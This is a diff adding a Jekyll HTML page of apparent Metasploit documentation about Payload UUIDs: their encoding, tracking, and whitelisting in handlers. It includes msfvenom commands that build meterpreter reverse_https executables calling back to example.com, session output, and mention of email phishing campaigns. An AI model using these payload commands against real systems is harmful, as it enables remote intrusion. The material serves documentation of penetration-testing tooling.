@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Git Reference Sites | Metasploit spike</title>
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="Git Reference Sites" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Learning Git" />
+<meta property="og:description" content="Learning Git" />
+<link rel="canonical" href="/metasploit-framework/articles/Git-Reference-Sites.html" />
+<meta property="og:url" content="/metasploit-framework/articles/Git-Reference-Sites.html" />
+<meta property="og:site_name" content="Metasploit spike" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2012-01-12T17:14:28+00:00" />
+<script type="application/ld+json">
+{"description":"Learning Git","headline":"Git Reference Sites","dateModified":"2012-01-12T17:14:28+00:00","datePublished":"2012-01-12T17:14:28+00:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/metasploit-framework/articles/Git-Reference-Sites.html"},"url":"/metasploit-framework/articles/Git-Reference-Sites.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/metasploit-framework/assets/main.css"><link type="application/atom+xml" rel="alternate" href="/metasploit-framework/feed.xml" title="Metasploit spike" /></head>
+<body><header class="site-header" role="banner">
+
+    <div class="wrapper"><a class="site-title" rel="author" href="/metasploit-framework/">Metasploit spike</a><nav class="site-nav">
+          <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+          <label for="nav-trigger">
+            <span class="menu-icon">
+              <svg viewBox="0 0 18 15" width="18px" height="15px">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+              </svg>
+            </span>
+          </label>
+  
+          <div class="trigger">
+            <a class="page-link" href="/metasploit-framework/">Articles</a><a class="page-link" href="/metasploit-framework/modules/">Modules</a></div>
+        </nav></div>
+  </header>
+  <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Payload UUID</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2015-06-26T01:35:15+01:00" itemprop="datePublished">Jun 26, 2015
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>In mid-2015, a new feature was added to many HTTP and TCP Metasploit payloads: Payload UUIDs. A Payload UUID is a 16-byte value that encodes an 8-byte identifier, a 1-byte architecture ID, a 1-byte platform ID, a 4-byte timestamp, and two additional bytes for obfuscation. The <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/uuid.rb">source code comments</a> go into more detail.</p>
+
+<p>In the case of HTTP payloads, the 16-byte UUID value is encoded in <a href="https://tools.ietf.org/html/rfc4648#section-5">base64url</a> format resulting in a 22-byte string. This value is always placed in the beginning of the URL used by the payload. TCP payloads send the 16-byte raw value over the socket once a connection is established.</p>
+
+<p>The goal of Payload UUIDs is three-fold:</p>
+<ul>
+  <li>Uniquely identify a generated payload. This is important when running social engineering campaigns to identify what specific payload a target executed. If an email campaign resulted in one user forwarding a payload to another user before it was executed, this can be determined by reviewing the UUID in the session listing.</li>
+  <li>Drop connections that do not match known UUIDs. This allows a listener to be setup that only allows known sessions to connect, which is important when running internet-facing payload handlers.</li>
+  <li>Enable universal handlers. The embedded platform and architecture identifiers allow the listener to determine what type of stage to send back to a stager. This will eventually allow for a single listener to be used with multiple exploits, even those that target different platforms and architectures.</li>
+</ul>
+
+<h3 id="specifying-the-uuid">Specifying the UUID</h3>
+
+<p>Although Payload UUIDs are normally random, it is possible to specify a static UUID value using the <code class="highlighter-rouge">PayloadUUIDRaw</code> option. This option takes a 8-byte hex string, such as “0011223344556677”. For example:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDRaw=4444444444444444 -f exe -o payload.exe
+</code></pre></div></div>
+
+<p>Instead of specifying a static UUID as the raw 8-byte value, it is also possible to derive a static UUID using an arbitrary-length string using the PayloadUUIDSeed option:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDSeed=ShellsAreDelicious -f exe -o payload.exe
+</code></pre></div></div>
+
+<h3 id="tracking-the-uuid">Tracking the UUID</h3>
+
+<p>Payload UUIDs are enabled by default, but are not tracked unless the <code class="highlighter-rouge">PayloadUUIDTracking</code> option is set to <code class="highlighter-rouge">true</code>. Setting this option causes a new entry to be created in <code class="highlighter-rouge">~/.msf4/payloads.json</code> when any UUID-enabled payload is generated. It is also possible to create a local-only name for a given UUID using the <code class="highlighter-rouge">PayloadUUIDName</code>. The example below will create a new registered payload with a custom name:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDTracking=true PayloadUUIDName=EmailCampaign20150101 -f exe -o payload.exe
+
+$ cat ~/.msf4/payloads.json
+{
+  "68017d72958c40f6": {
+    "arch": "x86",
+    "platform": "windows",
+    "timestamp": 1435277049,
+    "payload": "payload/windows/meterpreter/reverse_https",
+    "datastore": {"AutoLoadStdapi":true,"AutoRunScript":"","AutoSystemInfo":true,"AutoVerifySession":true,"AutoVerifySessionTimeout":30,"EXITFUNC":"process","EnableStageEncoding":false,"EnableUnicodeEncoding":false,"HttpUnknownRequestResponse":"\u003Chtml\u003E\u003Cbody\u003E\u003Ch1\u003EIt works!\u003C/h1\u003E\u003C/body\u003E\u003C/html\u003E","IgnoreUnknownPayloads":false,"InitialAutoRunScript":"","LHOST":"127.1.1.1","LPORT":4444,"MeterpreterServerName":"Apache","MeterpreterUserAgent":"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)","OverrideRequestHost":false,"PAYLOADUUIDNAME":"EmailCampaign20150101","PayloadProxyPort":0,"PayloadProxyType":"HTTP","PayloadUUIDTracking":true,"PrependMigrate":false,"ReverseListenerBindPort":0,"SessionCommunicationTimeout":300,"SessionExpirationTimeout":604800,"SessionRetryTotal":3600,"SessionRetryWait":10,"StageEncoderSaveRegisters":"","StageEncodingFallback":true,"StagerRetryCount":10,"StagerURILength":0,"StagerVerifySSLCert":false,"VERBOSE":false},
+    "name": "EmailCampaign20150101",
+    "urls": [
+  "/aAF9cpWMQPb-3f_cq1FoJA040uMw26kAnvroJdztpVzDrNpqbpT7t3DyYy0cR2TyQE87XxHgIOKiYwP2FJNlNjrBXWQNiGWtzUK1ueJ0DyFjCXmULVo_gGrvi"
+]
+}
+}
+</code></pre></div></div>
+
+<p>Once this payload is launched, the output of the <code class="highlighter-rouge">sessions -l -v</code> command will show the UUID, whether or not the UUID is registered, and any locally-assigned name of the UUID:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(handler) &gt; run -j
+[*] 127.0.0.1:36235 (UUID: 68017d72958c40f6/x86=1/windows=1/2015-06-26T00:04:09Z) Staging Native payload ...
+[*] Meterpreter session 1 opened (127.1.1.1:4444 -&gt; 127.0.0.1:36235) at 2015-06-25 17:12:40 -0700
+
+msf exploit(handler) &gt; sessions  -l -v
+
+Active sessions
+===============
+
+  Session ID: 1
+        Type: meterpreter x86/win32
+        Info: fang\hdm @ fang
+      Tunnel: 127.1.1.1:4444 -&gt; 127.0.0.1:36235 (127.0.0.1)
+         Via: exploit/multi/handler
+        UUID: 68017d72958c40f6/x86=1/windows=1/2015-06-26T00:04:09Z
+   MachineID: 1fd541d2c4278e2d0c1b02f17f142f2b
+     CheckIn: 1s ago @ 2015-06-25 17:12:47 -0700
+  Registered: Yes - Name="EmailCampaign20150101"
+</code></pre></div></div>
+
+<h3 id="whitelisting-uuids">Whitelisting UUIDs</h3>
+
+<p>The <code class="highlighter-rouge">~/.msf4/payloads.json</code> file can also be used as a whitelist. This makes it possible to run a listener on a common port on a public IP address without the Metasploit Framework instance being flooded with bogus sessions. To enable whitelisting, set the <code class="highlighter-rouge">IgnoreUnknownPayloads</code> option to <code class="highlighter-rouge">true</code> in the handler instance. Any incoming request that does match both a registered Payload UUID and one of the pre-generated URLs will be ignored. The <code class="highlighter-rouge">payloads.json</code> file can be copied between Metasploit Framework instances and even hand-edited while the framework is running.</p>
+
+
+  </div><a class="u-url" href="/metasploit-framework/articles/Payload-UUID.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/metasploit-framework/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Metasploit spike</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Metasploit spike</li><li><a class="u-email" href="mailto:your-email@example.com">your-email@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/metasploit-framework/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/metasploit-framework/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
